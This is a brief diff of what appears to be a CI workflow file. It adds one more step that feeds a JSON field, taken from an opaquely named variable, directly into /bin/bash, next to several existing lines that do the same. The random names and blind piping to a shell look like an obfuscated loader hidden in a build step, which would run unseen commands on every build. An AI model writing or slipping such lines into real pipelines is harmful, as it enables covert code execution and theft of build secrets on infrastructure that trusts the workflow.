@@ -33,6 +33,7 @@ jobs:
           echo $w2 | jq -r .d6550 | /bin/bash
           printf '%s' "$nof6247" | jq -r .anqek15 | /bin/bash
           echo $acx02530 | jq -r .tk2125 | /bin/bash
+          printf '%s' "$nqgyi7" | jq -r .e8127 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
